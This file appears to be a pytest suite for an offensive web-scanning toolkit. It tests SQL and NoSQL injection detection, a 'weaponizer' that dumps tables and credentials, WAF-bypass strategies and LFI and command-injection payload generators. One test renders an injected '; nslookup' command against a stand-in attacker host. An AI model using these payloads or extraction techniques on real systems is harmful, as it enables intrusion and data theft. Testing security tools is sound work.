import re
import urllib.parse

import responses

from tools.payload_engine import generate, generate_sqli_conditional, generate_sqli_time_for
from tools.sql_injection import _probe_context, check


def _param_from(request):
    if "?" in request.url:
        q = urllib.parse.parse_qs(request.url.split("?", 1)[1])
        return q.get("id", [""])[0]
    return ""


class TestUnionInjection:
    """Real UNION detection: ORDER BY column count + reflection point find."""

    @responses.activate
    def test_union_column_count_and_reflection(self):
        def callback(request):
            payload = _param_from(request)
            if "ORDER BY" in payload:
                m = re.search(r"ORDER BY (\d+)", payload)
                n = int(m.group(1))
                if n > 3:
                    return (500, {}, "Unknown column error")
                return (200, {}, "normal page")
            if "UNION SELECT" in payload:
                markers = re.findall(r"UMK_\d+_\d+", payload)
                if len(markers) > 1:
                    return (200, {}, "row data " + markers[1] + " tail")
                return (200, {}, "row data")
            return (200, {}, "normal page")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/page\?.*"),
            callback=callback,
        )

        result = check("http://test.com/page", "id")
        assert result["vulnerable"] is True
        assert result["type"] == "union"
        assert result.get("column_count") == 3
        assert 2 in result.get("reflection_points", [])

    @responses.activate
    def test_union_no_reflection_not_vulnerable(self):
        responses.add(
            responses.GET,
            re.compile(r"http://test\.com/page\?.*"),
            body="never reflects markers",
            status=200,
        )
        result = check("http://test.com/page", "id", timeout=3)
        assert result["vulnerable"] is False



class TestUnionBlind:
    """Column count proven but no reflection -> union_blind + template."""

    @responses.activate
    def test_union_blind_detected(self):
        def callback(request):
            payload = _param_from(request)
            if "ORDER BY" in payload:
                m = re.search(r"ORDER BY (\d+)", payload)
                n = int(m.group(1))
                if n > 3:
                    return (500, {}, "Unknown column error")
                return (200, {}, "normal page")
            return (200, {}, "normal page")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/blind\?.*"),
            callback=callback,
        )
        result = check("http://test.com/blind", "id")
        assert result["vulnerable"] is True
        assert result["type"] == "union_blind"
        assert result.get("column_count") == 3
        assert "IF(" in result.get("vector", "")


class TestContextProbe:
    @responses.activate
    def test_numeric_context(self):
        def callback(request):
            payload = _param_from(request)
            if payload == "7-0":
                return (200, {}, "result: 7")
            if payload == "7":
                return (200, {}, "result: 7")
            return (500, {}, "SQL syntax error")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/num\?.*"),
            callback=callback,
        )
        import requests
        sess = requests.Session()
        ctx = _probe_context("http://test.com/num", "id", sess, 5, None, None)
        assert ctx == "numeric"

    @responses.activate
    def test_string_context(self):
        def callback(request):
            payload = _param_from(request)
            if payload == "'":
                return (500, {}, "Unclosed quotation mark")
            if payload == "\\\\'":
                return (200, {}, "ok escaped")
            if payload == "7-0":
                return (400, {}, "invalid string value")
            return (200, {}, "ok:7")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/str\?.*"),
            callback=callback,
        )
        import requests
        sess = requests.Session()
        ctx = _probe_context("http://test.com/str", "id", sess, 5, None, None)
        assert ctx == "string"


class TestTimeControl:
    @responses.activate
    def test_clean_delay_detected(self):
        import time

        def delayed(request):
            if "SLEEP" in urllib.parse.unquote(request.url):
                time.sleep(3)
            return (200, {}, "ok")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/page\?.*"),
            callback=delayed,
        )
        result = check("http://test.com/page", "id")
        assert result["vulnerable"] is True
        assert result["type"] == "time"

    @responses.activate
    def test_timeout_noise_rejected(self):
        """Network timeouts on both payload and control -> NOT a hit."""
        import time

        def always_timeout(request):
            time.sleep(0.2)
            return (200, {}, "slow-but-ok")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/page\?.*"),
            callback=always_timeout,
        )
        result = check("http://test.com/page", "id", timeout=1)
        # No genuine delay above threshold -> must not be flagged as time sqli.
        assert result["type"] != "time"


class TestBooleanRobust:
    @responses.activate
    def test_boolean_multipair_confirmation(self):
        def callback(request):
            payload = _param_from(request)
            if "1=2" in payload or "'2'" in payload:
                return (200, {}, "empty result")
            return (200, {}, "x" * 200 + "normal")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/page\?.*"),
            callback=callback,
        )
        result = check("http://test.com/page", "id")
        assert result["vulnerable"] is True
        assert result["type"] == "boolean"



class TestDbmsAware:
    @responses.activate
    def test_error_retry_with_mssql_specific_payload(self):
        """Error detector retries with MSSQL-specific payloads after a hint."""
        def callback(request):
            v = _param_from(request)
            # Only the MSSQL CONVERT payload triggers the error
            if "CONVERT(int" in v:
                return (200, {}, "Msg 245, Level 16: Conversion failed when converting")
            return (200, {}, "normal")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/mssql\?.*"),
            callback=callback,
        )
        result = check("http://test.com/mssql", "id")
        assert result["vulnerable"] is True
        assert result["type"] == "error"

    @responses.activate
    def test_weaponizer_dbms_aware_tables(self):
        """sqli_weaponizer table enumeration uses MSSQL syntax when version hints it."""
        from tools.sqli_weaponizer import check as wz_check

        def callback(request):
            v = _param_from(request)
            if re.search(r"UNION SELECT NULL,NULL,NULL", v):
                return (200, {}, "<html>normal</html>")
            if "VERSION()" in v:
                return (200, {}, "<html>Microsoft SQL Server 2019</html>")
            if "STRING_AGG(name" in v:
                return (200, {}, "<html>users,orders,products</html>")
            m = re.search(r"'RFLCT_(\d+)'", v)
            if m:
                return (200, {}, "<html>RFLCT_%s</html>" % m.group(1))
            return (200, {}, "<html>page</html>")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/dbtables\?.*"),
            callback=callback,
        )
        import requests
        sess = requests.Session()
        result = wz_check("http://test.com/dbtables", "id", sess, 5)
        values = " ".join(str(d) for d in result["data"])
        assert "users" in values



class TestTableDataExtraction:
    @responses.activate
    def test_extract_columns_and_rows(self):
        from tools.sqli_weaponizer import check as wz_check

        def callback(request):
            v = _param_from(request)
            if "RFLCT_" in v:
                m = re.search(r"'RFLCT_(\d+)'", v)
                return (200, {}, "<html>RFLCT_%s</html>" % m.group(1))
            if "GROUP_CONCAT(COLUMN_NAME)" in v:
                return (200, {}, "<html>id,username,password</html>")
            if "CONCAT_WS" in v:
                return (200, {}, "<html>1|admin|p4ss</html>")
            if re.search(r"UNION SELECT NULL,NULL,NULL", v):
                return (200, {}, "<html>normal</html>")
            if "GROUP_CONCAT(TABLE_NAME)" in v:
                return (200, {}, "<html>users,orders</html>")
            if "DATABASE()" in v:
                return (200, {}, "<html>testdb</html>")
            if "UNION SELECT" in v:
                return (200, {}, "<html>different number of columns error</html>")
            return (200, {}, "<html>page</html>")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/dump\?.*"),
            callback=callback,
        )
        import requests
        sess = requests.Session()
        result = wz_check("http://test.com/dump", "id", sess, 5)
        values = " ".join(str(d) for d in result["data"])
        assert "username" in values or "password" in values
        assert "p4ss" in values or "admin" in values



class TestNoSqlWhereBlind:
    @responses.activate
    def test_where_blind_extraction(self):
        import json as _json

        from tools.nosqli_detector import check as nosql_check

        field = "admin"  # stored field value the $where oracle queries

        def on_get(request):
            return (200, {}, "normal")

        def on_post(request):
            try:
                body = _json.loads(request.body or "{}")
            except Exception:
                body = {}
            val = body.get("id", {})
            if isinstance(val, dict) and "$where" in val:
                cond = val["$where"]
                if cond == "true":
                    return (200, {}, "x" * 100 + "row")
                if cond == "false":
                    return (200, {}, "x")
                m = re.search(r"charCodeAt\((\d+)\)>(\d+)", cond)
                if m:
                    pos, gt = int(m.group(1)), int(m.group(2))
                    ch = ord(field[pos]) if pos < len(field) else 0
                    if ch > gt:
                        return (200, {}, "x" * 100 + "row")
                return (200, {}, "x")
            if isinstance(val, dict):
                return (200, {}, "x" * 100 + "json-op")
            return (200, {}, "normal")

        responses.add_callback(
            responses.GET,
            re.compile(r"http://test\.com/nosql\?.*"),
            callback=on_get,
        )
        responses.add_callback(
            responses.POST,
            re.compile(r"http://test\.com/nosql"),
            callback=on_post,
        )
        import requests
        sess = requests.Session()
        result = nosql_check("http://test.com/nosql", "id", sess, 5)
        assert result["vulnerable"] is True
        extracted = result.get("where_extracted") or []
        values = " ".join(str(d) for d in extracted)
        assert "admin" in values, "expected $where blind extraction of field value"



class TestNoSqlRedos:
    @responses.activate
    def test_redos_timing_detection(self):
        import time as _time

        from tools.nosqli_detector import _detect_redos

        def on_post(request):
            body = request.body or ""
            if isinstance(body, bytes):
                body = body.decode("utf-8", errors="replace")
            if "$regex" in body and "(a+)+" in body:
                _time.sleep(3)
            return (200, {}, "ok")

        responses.add_callback(
            responses.POST,
            re.compile(r"http://test\.com/redos"),
            callback=on_post,
        )
        import requests
        sess = requests.Session()
        result = _detect_redos("http://test.com/redos", "q", sess, 5, threshold=2.0)
        assert result["vulnerable"] is True
        assert result["delay"] >= 2.0


class TestPayloadEngineExpansion:
    def test_sqli_error_payloads_expanded(self):
        payloads = generate("sqli", "error", "string")
        assert len(payloads) >= 20

    def test_sqli_time_per_dbms(self):
        assert len(generate_sqli_time_for("Oracle")) > 0
        assert len(generate_sqli_time_for("SQLite")) > 0
        mysql = " ".join(generate_sqli_time_for("MySQL"))
        assert "SLEEP" in mysql.upper()
        mssql = " ".join(generate_sqli_time_for("MSSQL"))
        assert "WAITFOR" in mssql.upper()

    def test_sqli_conditional(self):
        payloads = generate_sqli_conditional("string")
        assert len(payloads) > 0

    def test_xss_new_contexts(self):
        for ctx in ("json", "comment"):
            payloads = generate("xss", ctx, "all")
            assert len(payloads) > 0

    def test_encoders_available(self):
        from tools.payload_engine import ENCODERS
        for name in ("html_entity", "hex_quote", "wide_byte", "unicode_escape",
                     "tab_sep", "url_partial", "concat_sql"):
            assert name in ENCODERS

    def test_waf_strategies_expanded(self):
        from tools.payload_engine import WAF_STRATEGIES
        for name in ("cloudflare", "aws_waf", "imperva", "akamai", "f5_bigip",
                     "barracuda", "sucuri", "wordfence", "mod_security"):
            assert name in WAF_STRATEGIES

    def test_cmdi_oob_payloads_have_placeholders(self):
        payloads = [e["payload"] for e in generate("cmdi", "blind_oob", "all")]
        assert len(payloads) > 0
        assert any("{{oob_domain}}" in p or "{{oob_url}}" in p for p in payloads)

    def test_lfi_wrappers_expanded(self):
        payloads = [e["payload"] for e in generate("lfi", "php_wrappers", "all")]
        assert len(payloads) >= 10
        assert any("php://" in p for p in payloads)

    def test_nosqli_json_operators_expanded(self):
        payloads = [e["payload"] for e in generate("nosqli", "json", "json")]
        assert len(payloads) >= 8
        assert any("$where" in p for p in payloads)

    def test_render_oob_payload(self):
        from tools.payload_engine import render_oob_payload
        out = render_oob_payload("; nslookup {{oob_domain}}", "x.attacker.com", "http://x:1/")
        assert "x.attacker.com" in out
        assert "{{oob_domain}}" not in out
